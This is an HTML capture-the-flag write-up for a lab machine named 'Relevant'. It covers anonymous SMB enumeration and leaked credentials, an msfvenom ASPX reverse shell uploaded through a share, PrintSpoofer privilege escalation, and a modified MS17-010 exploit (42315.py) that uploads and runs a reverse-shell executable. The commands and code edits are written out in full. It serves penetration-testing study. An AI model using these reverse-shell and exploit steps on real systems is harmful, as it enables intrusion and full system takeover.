<!doctype html>
<html>
<head>
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
  <title>relevant</title>
  <meta name="generator" content="CherryTree">
  <link rel="stylesheet" href="res/styles4.css" type="text/css" />
</head>
<body>
<div class='page'><h1 class='title'>relevant</h1><br/><p><strong>Relevant</strong></p><p>Target Machine IP: <strong>10.10.20.25		10.10.6.72</strong>		<strong>10.10.227.128</strong></p><p></p><p>We start basic nmap scan.</p><p></p><p>nmap -A 10.10.20.25</p><p></p><p><img src="images/9-1.png" alt="images/9-1.png" /></p><p></p><p>We open the webserver running on Port 80 and find a default Microsoft IIS webpage.</p><p></p><p>Next, I try to enumearte smaba shares on Port 445</p><p></p><p>I give -U guest with dummy password. it throws error.</p><p>I try with no user and dummy password when asked for root password. It works!</p><p></p><p><img src="images/9-2.png" alt="images/9-2.png" /></p><p></p><p><img src="images/9-3.png" alt="images/9-3.png" /></p><p></p><p><img src="images/9-4.png" alt="images/9-4.png" /></p><p></p><p>I then decode the passwords using base64</p><p></p><p><img src="images/9-5.png" alt="images/9-5.png" /></p><p></p><p>We keep this information for future reference.</p><p></p><p></p><p><strong><span style="text-decoration:underline;">Foothold : Way - 1</span></strong></p><p>Now, I will try to enumerate directories for the web server.</p><p></p><p>But we do not find any directories.</p><p></p><p>We use nmap again to scan all ports using -p- option.</p><p><em><strong>nmap -sS -p- 10.10.20.25</strong></em></p><p></p><p>This will find 4 new ports. We scan them again.</p><p></p><p><img src="images/9-6.png" alt="images/9-6.png" /></p><p></p><p></p><p>We find the port <strong>49663</strong> also has a web server.</p><p>We use gobuster again to find hidden directories, but we didn&#39;t find any.</p><p></p><p>Then we try the same name of samba share as a directory.</p><p></p><p><em>http://10.10.20.25:80/nt4wrksv/passwords.txt</em></p><p><em><strong>http://10.10.20.25:49663/nt4wrksv/passwords.txt</strong></em></p><p></p><p>The second URL prints the passwords.txt file which we downloaded eralier.</p><p></p><p>Using the Port 49663 we can access the samba shared file. Thus we can upload a (ASPX Reverse Shell) in the samba share and run it from the web server at port 49663</p><p></p><p>Note: The Wappalyzer app of Firefox hinted the ASP .Net Backend web framework</p><p></p><p><em><strong>msfvenom -p windows/x64/shell_reverse_tcp  LHOST=10.11.72.31 LPORT=7777 -f aspx -o shell.aspx</strong></em></p><p></p><p><strong>Note:</strong> <strong>Stageless</strong> webshell is mandatory</p><p></p><p>We connect to the samba share and upload the file using the following command.</p><p><em><strong>put shell.aspx</strong></em></p><p></p><p>We start a netcat listener on attack machine.</p><p></p><p>Then trigger the reverse shell using the following URL:</p><p><em><strong>http://10.10.6.72:49663/ntwrksv/shell.aspx</strong></em></p><p></p><p>We will get a shell as normal user.</p><p><em><strong>iis apppool\defaultapppool</strong></em></p><p></p><p>However, with this user we can get the user flag from <em><strong>C:\Users\Bob\Desktop\user.txt</strong></em></p><p></p><p><strong>Privilege Escalation:</strong></p><p>We run</p><p>whoami /priv</p><p></p><p><img src="images/9-7.png" alt="images/9-7.png" /></p><p></p><p>It confirm that <strong>SeImpersonatePrivilege</strong> is enabled. We will use the following to exploit this.</p><p></p><p><em><strong>https://github.com/itm4n/PrintSpoofer</strong></em></p><p></p><p>We download the <em><strong>PrintSpoofer64.exe</strong></em> from the github release.</p><p></p><p>We upload it to the server using smb.</p><p><em><strong>put PrintSpoofer64.exe</strong></em></p><p></p><p>We find the location in our revershell using the <em><strong>“net share”</strong></em> command that lists all windows shares.</p><p></p><p>We go to the location and run:</p><p><em><strong>Printspoofer64.exe -i -c cmd.exe</strong></em></p><p></p><p><img src="images/9-8.png" alt="images/9-8.png" /></p><p></p><p>Now we have system access. We get the root flag at C:\Users\Administrator\Desktop\root.txt</p><p></p><p></p><p><strong><span style="text-decoration:underline;">Foothold : Way - 2</span></strong></p><p></p><p>We begin by doing nmap again, but this time we use <strong>vuln</strong> script to check for vulnerabilities.</p><p></p><p><em><strong>nmap --script vuln 10.10.20.25 </strong></em>	[Note: Generally we should include ports with -p for efficiency]</p><p></p><p>This will show <strong>ms17-010</strong> vulnerability.</p><p></p><p><strong>Note: </strong>As the server is not running windows 7, we cannot run “<strong>eternalblue</strong>” exploit directly from metasploit framework.</p><p></p><p>Thus, we search for ms17-010 in exploit database.</p><p></p><p><img src="images/9-9.png" alt="images/9-9.png" /></p><p></p><p>We will use the python code that supports <strong>Microsoft Windows 2016 R2</strong> (This was hinted in OS detection of initial nmap scan.</p><p></p><p>Get the file to user working directory using.</p><p></p><p><em><strong>searchsploit -m windows/remote/42315.py</strong></em></p><p></p><p><strong>Note: </strong>This will require <strong>python2</strong></p><p>(So impacket also has be installed for python2. [pip2 install impacket])</p><p></p><p>Then examine the file and edit the following:</p><p> 	</p><p>1) We need to give values in username and password.</p><p>Luckily we have 2 usernames and passwords.</p><p><strong></strong></p><p><strong>Note:</strong> While enumerating the machine earlier, I tried to RDP into the machine using the gained credentials.</p><p>Both the users couldn&#39;t login. However, the error message of user <strong>Jill</strong> suggested that her password is expired.</p><p>Thus for our python program lets start with <strong>Bob</strong> and <strong>!P@$$W0rD!123</strong></p><p></p><p>2) Starting from Line 916. Comment out the following. The following lines are used to create a file bane “pwned.txt” as a POC. However, we need a reverse shell, so we will replace it the following.</p><p></p><p><em>	#print(&#39;creating file c:\\pwned.txt on the target&#39;)</em></p><p><em>	#tid2 = smbConn.connectTree(&#39;C$&#39;)</em></p><p><em>	#fid2 = smbConn.createFile(tid2, &#39;/pwned.txt&#39;)</em></p><p><em>	#smbConn.closeFile(tid2, fid2)</em></p><p><em>	#smbConn.disconnectTree(tid2)</em></p><p></p><p><em><strong>	smb_send_file(smbConn, &#39;rshell.exe&#39;, &#39;C&#39;, &#39;/rshell.exe&#39; )</strong></em></p><p><em><strong>	service_exec(conn, r&#39;C:\rshell.exe&#39;)</strong></em></p><p></p><p>3) Create a <strong>stageless</strong> reverse shell using msfvenom</p><p></p><p><em><strong>msfvenom -p windows/x64/shell_reverse_tcp  LHOST=10.11.72.31 LPORT=7777 -f exe -o rshell.exe</strong></em></p><p></p><p>3) Get this prequisite file.</p><p><em><strong>wget https://raw.githubusercontent.com/worawit/MS17-010/master/mysmb.py</strong></em></p><p></p><p>Keep both the <strong>42315.py, mysmb.py and rshell.exe</strong> in the same directory and run the exploit as follows:</p><p></p><p>4) Start a netcat listner: <em><strong>nc -lvnp 7777</strong></em></p><p></p><p>5) Run the exploit using python2: </p><p></p><p><em><strong>python2 42315.py 10.10.227.128</strong></em></p><p><em><strong></strong></em></p><p></p><p>We will get a reverse shell in our netcat listener. (we will directly foothold with admin access)</p><p></p><p><img src="images/9-10.png" alt="images/9-10.png" /></p><p></p><p></p><p>Thanks !!</p></div>
</body>
</html>
